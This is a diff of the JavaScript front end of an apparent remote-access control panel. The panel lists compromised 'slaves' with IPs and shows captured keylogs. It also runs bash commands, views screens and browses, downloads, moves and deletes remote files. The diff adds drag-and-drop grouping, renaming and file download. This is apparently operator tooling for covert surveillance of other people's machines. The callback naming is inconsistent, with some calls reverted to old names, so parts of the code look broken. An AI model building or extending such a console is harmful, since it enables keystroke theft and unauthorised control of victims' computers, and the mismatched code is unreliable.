@@ -14,10 +14,13 @@
  *   log_in, window_*, on_slave_*, on_page_change, on_group_toggle,
  *   on_bash_command, on_screen_*, on_slaves_refresh
  *   on_state_action(id, action)
- *   onOpenFolder(path), onOpenFile(path), onItemRemove(path, is_folder),
- *   onRename(path, new_path), onMove(path, new_path), onSaveFile(path, content),
- *   onCreateItem(path, is_folder)
- *   onKeyLogTimeRangeSet(start, end), onKeyLogSave(keys)
+ *   on_open_folder, on_open_file, on_item_remove, on_rename, on_move,
+ *   on_save_file, on_create_item, on_file_download
+ *   on_slave_display_name_changed(id, displayName)
+ *   on_slave_group_changed(id, group|null)
+ *   on_group_rename(oldName, newName)
+ *   on_group_create(name)
+ *   onKeyLogTimeRangeSet, onKeyLogSave
  */
 
 (function () {
@@ -106,6 +109,7 @@
   const explorerViewerEmpty = $('#explorer-viewer-empty');
   const btnExplorerSave = $('#btn-explorer-save');
   const btnExplorerClose = $('#btn-explorer-close-viewer');
+  const btnExplorerDownload = $('#btn-explorer-download');
   const keylogList = $('#keylog-list');
   const keylogEmpty = $('#keylog-empty');
   const keylogMeta = $('#keylog-meta');
@@ -236,44 +240,185 @@
       empty.className = 'tree-empty';
       empty.textContent = 'Dungeon is empty';
       slavesTreeEl.appendChild(empty);
-      return;
+    } else {
+      slavesTreeData.forEach(node => {
+        slavesTreeEl.appendChild(node.type === 'group' ? renderGroup(node) : renderSlave(node, null));
+      });
     }
-    slavesTreeData.forEach(node => {
-      slavesTreeEl.appendChild(node.type === 'group' ? renderGroup(node) : renderSlave(node));
-    });
+    // root drop zone for ungrouping
+    slavesTreeEl.classList.add('drop-root');
+    slavesTreeEl.ondragover = (e) => {
+      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
+      e.preventDefault();
+      slavesTreeEl.classList.add('drop-target');
+    };
+    slavesTreeEl.ondragleave = () => slavesTreeEl.classList.remove('drop-target');
+    slavesTreeEl.ondrop = (e) => {
+      slavesTreeEl.classList.remove('drop-target');
+      const id = e.dataTransfer.getData('application/x-slave-id');
+      if (!id) return;
+      e.preventDefault();
+      // only ungroup if dropping on empty root area (not on a child that stopped propagation)
+      callPython('on_slave_group_changed', id, null);
+    };
   }
 
   function renderGroup(group) {
     const el = document.createElement('div');
     el.className = 'tree-group' + (group.collapsed ? ' collapsed' : '');
+    el.dataset.group = group.name;
+
     const header = document.createElement('div');
     header.className = 'tree-group-header';
-    header.innerHTML = '<span class="chevron">▼</span><span class="group-name">' + escapeHtml(group.name) + '</span><span class="group-count" style="margin-left:auto;opacity:0.5">' + ((group.children || []).length) + '</span>';
-    header.addEventListener('click', () => {
+    header.innerHTML =
+      '<span class="chevron">▼</span>' +
+      '<span class="group-name">' + escapeHtml(group.name) + '</span>' +
+      '<span class="group-count" style="margin-left:auto;opacity:0.5">' + ((group.children || []).length) + '</span>';
+
+    header.addEventListener('click', (e) => {
+      if (e.target.closest('.group-name-input')) return;
       el.classList.toggle('collapsed');
       callPython('on_group_toggle', group.name, el.classList.contains('collapsed'));
     });
+
+    // rename group on double-click name
+    const nameSpan = header.querySelector('.group-name');
+    nameSpan.addEventListener('dblclick', (e) => {
+      e.stopPropagation();
+      startGroupRename(group, nameSpan);
+    });
+
+    // accept slave drops into group
+    header.addEventListener('dragover', (e) => {
+      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
+      e.preventDefault();
+      e.stopPropagation();
+      header.classList.add('drop-target');
+    });
+    header.addEventListener('dragleave', () => header.classList.remove('drop-target'));
+    header.addEventListener('drop', (e) => {
+      header.classList.remove('drop-target');
+      const id = e.dataTransfer.getData('application/x-slave-id');
+      if (!id) return;
+      e.preventDefault();
+      e.stopPropagation();
+      callPython('on_slave_group_changed', id, group.name);
+    });
+
     const body = document.createElement('div');
     body.className = 'tree-group-body';
-    (group.children || []).forEach(child => {
-      body.appendChild(child.type === 'group' ? renderGroup(child) : renderSlave(child));
+    body.addEventListener('dragover', (e) => {
+      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
+      e.preventDefault();
+      e.stopPropagation();
+      header.classList.add('drop-target');
     });
-    el.appendChild(header); el.appendChild(body);
+    body.addEventListener('drop', (e) => {
+      header.classList.remove('drop-target');
+      const id = e.dataTransfer.getData('application/x-slave-id');
+      if (!id) return;
+      e.preventDefault();
+      e.stopPropagation();
+      callPython('on_slave_group_changed', id, group.name);
+    });
+
+    (group.children || []).forEach(child => {
+      body.appendChild(child.type === 'group' ? renderGroup(child) : renderSlave(child, group.name));
+    });
+    el.appendChild(header);
+    el.appendChild(body);
     return el;
   }
 
-  function renderSlave(slave) {
+  function startGroupRename(group, nameSpan) {
+    const input = document.createElement('input');
+    input.className = 'group-name-input';
+    input.value = group.name;
+    nameSpan.replaceWith(input);
+    input.focus();
+    input.select();
+    const commit = () => {
+      const next = input.value.trim();
+      if (next && next !== group.name) {
+        callPython('on_group_rename', group.name, next);
+        group.name = next;
+      }
+      renderSlavesTree();
+    };
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') { e.preventDefault(); commit(); }
+      if (e.key === 'Escape') renderSlavesTree();
+    });
+    input.addEventListener('blur', commit);
+  }
+
+  function renderSlave(slave, groupName) {
     const el = document.createElement('div');
     el.className = 'slave-item' + (slave.id === activeSlaveId ? ' selected' : '');
     el.dataset.id = slave.id;
+    el.draggable = true;
     const pingStr = slave.ping != null ? slave.ping + ' ms' : '—';
-    el.innerHTML = '<span class="slave-status ' + (slave.online ? 'online' : '') + '"></span><span class="slave-name">' + escapeHtml(slave.displayName || slave.id) + '</span><div class="slave-meta"><span class="id">' + escapeHtml(slave.id) + '</span><span>' + escapeHtml(slave.ip || '—') + '</span><span>' + pingStr + '</span></div>';
-    el.addEventListener('click', () => openSlave(slave.id));
+    el.innerHTML =
+      '<span class="slave-status ' + (slave.online ? 'online' : '') + '"></span>' +
+      '<span class="slave-name">' + escapeHtml(slave.displayName || slave.id) + '</span>' +
+      '<button type="button" class="btn-rename-slave" title="Rename">✎</button>' +
+      '<div class="slave-meta"><span class="id">' + escapeHtml(slave.id) + '</span>' +
+      '<span>' + escapeHtml(slave.ip || '—') + '</span><span>' + pingStr + '</span></div>';
+
+    el.addEventListener('click', (e) => {
+      if (e.target.closest('.btn-rename-slave') || e.target.closest('.slave-name-input')) return;
+      openSlave(slave.id);
+    });
     el.addEventListener('contextmenu', (e) => {
       e.preventDefault();
       callPython('on_slave_context', slave.id, e.clientX, e.clientY);
     });
+
+    const nameEl = el.querySelector('.slave-name');
+    const startRename = (e) => {
+      if (e) e.stopPropagation();
+      const input = document.createElement('input');
+      input.className = 'slave-name-input';
+      input.value = slave.displayName || slave.id;
+      nameEl.replaceWith(input);
+      input.focus();
+      input.select();
+      const commit = () => {
+        const next = input.value.trim();
+        if (next && next !== (slave.displayName || slave.id)) {
+          slave.displayName = next;
+          callPython('on_slave_display_name_changed', slave.id, next);
+          if (activeSlaveId === slave.id) updateActiveSlaveBar(slave);
+        }
+        renderSlavesTree();
+      };
+      input.addEventListener('keydown', (ev) => {
+        if (ev.key === 'Enter') { ev.preventDefault(); commit(); }
+        if (ev.key === 'Escape') renderSlavesTree();
+      });
+      input.addEventListener('blur', commit);
+    };
+    nameEl.addEventListener('dblclick', startRename);
+    el.querySelector('.btn-rename-slave').addEventListener('click', startRename);
+
+    el.addEventListener('dragstart', (e) => {
+      e.dataTransfer.setData('application/x-slave-id', slave.id);
+      e.dataTransfer.effectAllowed = 'move';
+      el.classList.add('dragging');
+    });
+    el.addEventListener('dragend', () => el.classList.remove('dragging'));
+
     return el;
+  }
+
+  // new group button
+  const btnAddGroup = $('#btn-slaves-add-group');
+  if (btnAddGroup) {
+    btnAddGroup.addEventListener('click', () => {
+      const name = prompt('Group name');
+      if (!name || !name.trim()) return;
+      callPython('on_group_create', name.trim());
+    });
   }
 
   function openSlave(id) {
@@ -459,20 +604,69 @@
       const full = joinPath(explorerPath, entry.name);
       const el = document.createElement('div');
       el.className = 'explorer-item' + (entry.folder ? ' folder' : '') + (explorerOpenPath === full ? ' selected' : '');
-      el.innerHTML = '<span class="icon">' + (entry.folder ? '▣' : '▤') + '</span><span class="explorer-item-name">' + escapeHtml(entry.name) + '</span><span class="explorer-item-actions"><button type="button" data-act="rename" title="Rename">✎</button><button type="button" data-act="remove" title="Remove">×</button></span>';
+      el.draggable = true;
+      el.innerHTML =
+        '<span class="icon">' + (entry.folder ? '▣' : '▤') + '</span>' +
+        '<span class="explorer-item-name">' + escapeHtml(entry.name) + '</span>' +
+        '<span class="explorer-item-actions">' +
+          (entry.folder ? '' : '<button type="button" data-act="download" title="Download">↓</button>') +
+          '<button type="button" data-act="rename" title="Rename">✎</button>' +
+          '<button type="button" data-act="remove" title="Remove">×</button>' +
+        '</span>';
+
       el.addEventListener('click', (e) => {
         if (e.target.closest('[data-act]')) return;
-        if (entry.folder) callPython('on_open_folder', full); else callPython('on_open_file', full);
+        if (entry.folder) callPython('on_open_folder', full);
+        else callPython('on_open_file', full);
+      });
+
+      const dl = el.querySelector('[data-act="download"]');
+      if (dl) dl.addEventListener('click', (e) => {
+        e.stopPropagation();
+        callPython('on_file_download', full);
       });
       el.querySelector('[data-act="remove"]').addEventListener('click', (e) => {
-        e.stopPropagation(); callPython('onItemRemove', full, !!entry.folder);
+        e.stopPropagation(); callPython('on_item_remove', full, !!entry.folder);
       });
       el.querySelector('[data-act="rename"]').addEventListener('click', (e) => {
         e.stopPropagation();
         const next = prompt('Rename to', entry.name);
         if (!next || next === entry.name) return;
-        callPython('onRename', full, joinPath(explorerPath, next));
+        callPython('on_rename', full, joinPath(explorerPath, next));
       });
+
+      // drag file/folder
+      el.addEventListener('dragstart', (e) => {
+        e.dataTransfer.setData('application/x-explorer-path', full);
+        e.dataTransfer.setData('application/x-explorer-folder', entry.folder ? '1' : '0');
+        e.dataTransfer.effectAllowed = 'move';
+        el.classList.add('dragging');
+      });
+      el.addEventListener('dragend', () => el.classList.remove('dragging'));
+
+      // drop onto folder
+      if (entry.folder) {
+        el.addEventListener('dragover', (e) => {
+          if (!e.dataTransfer.types.includes('application/x-explorer-path')) return;
+          const src = e.dataTransfer.getData('application/x-explorer-path');
+          // getData may be empty during dragover in some browsers — still allow
+          e.preventDefault();
+          e.stopPropagation();
+          el.classList.add('drop-target');
+        });
+        el.addEventListener('dragleave', () => el.classList.remove('drop-target'));
+        el.addEventListener('drop', (e) => {
+          el.classList.remove('drop-target');
+          const src = e.dataTransfer.getData('application/x-explorer-path');
+          if (!src || src === full) return;
+          e.preventDefault();
+          e.stopPropagation();
+          const baseName = src.split('/').filter(Boolean).pop();
+          const dest = joinPath(full, baseName);
+          callPython('on_move', src, dest);
+        });
+      }
+
       explorerTree.appendChild(el);
     });
   }
@@ -481,6 +675,7 @@
     explorerOpenPath = path;
     explorerFileName.textContent = path || '—';
     btnExplorerSave.hidden = false; btnExplorerClose.hidden = false; explorerViewerEmpty.hidden = true;
+    if (btnExplorerDownload) btnExplorerDownload.hidden = false;
     const image = isImage === true || (isImage == null && isImageName(path));
     if (image) {
       explorerEditorWrap.hidden = true; explorerImageWrap.hidden = false; btnExplorerSave.hidden = true;
@@ -500,13 +695,14 @@
   function closeExplorerViewer() {
     explorerOpenPath = null; explorerFileName.textContent = '—';
     btnExplorerSave.hidden = true; btnExplorerClose.hidden = true;
+    if (btnExplorerDownload) btnExplorerDownload.hidden = true;
     explorerImageWrap.hidden = true; explorerEditorWrap.hidden = true; explorerViewerEmpty.hidden = false;
     explorerImage.removeAttribute('src');
     if (cmEditor) cmEditor.setValue('');
     renderExplorerTree();
   }
 
-  $('#btn-explorer-up').addEventListener('click', () => callPython('on_open_folder', parentPath(explorerPath)));
+  $('#btn-explorer-up').addEventListener('click', () => callPython('onOpenFolder', parentPath(explorerPath)));
   $('#btn-explorer-new-file').addEventListener('click', () => {
     const name = prompt('File name'); if (!name) return;
     callPython('onCreateItem', joinPath(explorerPath, name), false);
